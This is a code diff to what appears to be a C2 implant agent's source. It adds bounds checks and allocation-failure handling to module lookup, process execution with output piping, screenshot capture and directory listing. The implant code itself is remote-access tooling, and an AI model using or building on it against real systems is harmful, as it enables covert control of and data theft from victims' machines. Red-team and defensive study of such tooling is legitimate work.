@@ -179,6 +179,12 @@ PVOID LdrModuleSearch(
     Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
     FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
 
+    /* Name[260] must also fit an appended ".dll" and the NUL: reject
+     * anything that can't */
+    if ( ! ModuleName || StringLengthW( ModuleName ) >= 260 - 4 ) {
+        return NULL;
+    }
+
     StringCopyW( Name, ModuleName );
 
     if ( ! EndsWithIW( ModuleName, Dll ) )
@@ -226,6 +232,12 @@ PVOID LdrModuleLoad(
     NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
     if ( ! ModuleName ) {
+        return NULL;
+    }
+
+    /* NameW[260] is a fixed buffer: an ANSI name of 260+ chars would
+     * overflow the conversion below */
+    if ( StringLengthA( ModuleName ) >= 260 ) {
         return NULL;
     }
 
@@ -605,6 +617,11 @@ BOOL ProcessCreate(
     {
         PUTS( "Piped enabled" )
         AnonPipe = Instance->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
+        if ( ! AnonPipe )
+        {
+            PUTS( "Failed to allocate anon pipe structure" )
+            return FALSE;
+        }
         MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
         AnonPipesInit( AnonPipe );
 
@@ -748,6 +765,13 @@ BOOL ProcessCreate(
             INT32 i  = 0;
             INT32 x  = ( INT32 ) StringLengthW( CmdLine );
             PWCHAR s = Instance->Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );
+            if ( ! s )
+            {
+                PRINTF( "LocalAlloc: Failed [%d]\n", NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_NOT_ENOUGH_MEMORY );
+                Return = FALSE;
+                goto Cleanup;
+            }
 
             MemCopy( s, CmdLine, x );
 
@@ -1028,7 +1052,16 @@ VOID AnonPipesRead(
 
         dwBufferSize += dwRead;
 
-        Buffer = Instance->Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );
+        LPVOID ReAlloced = Instance->Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );
+
+        if ( ! ReAlloced ) {
+            /* allocation failed: keep the old buffer and send what we have so
+             * far instead of losing the pointer (leak) and sending from NULL */
+            dwBufferSize -= dwRead;
+            break;
+        }
+
+        Buffer = ReAlloced;
 
         MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
         MemSet( buf, 0, dwRead );
@@ -1109,6 +1142,10 @@ BOOL WinScreenshot(
 
     BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
     BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );
+    if ( ! BitMapImage ) {
+        PUTS( "Failed to allocate bitmap buffer" )
+        goto Cleanup;
+    }
 
     hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
     if ( ! hMemDC ) {
@@ -1522,8 +1559,14 @@ PROOT_DIR listDir(
         goto Cleanup;
     }
 
-    // copy the path
+    // copy the path. an empty path would make the PathSize - 1 accesses
+    // below read out of bounds, so reject it up front.
     PathSize = MIN( MAX_PATH, StringLengthW( StartPath ) );
+    if ( PathSize == 0 )
+    {
+        PUTS( "Empty path" );
+        goto Cleanup;
+    }
     MemCopy( Path, StartPath, PathSize * sizeof( WCHAR ) );
 
     // search for the first file in the folder specified
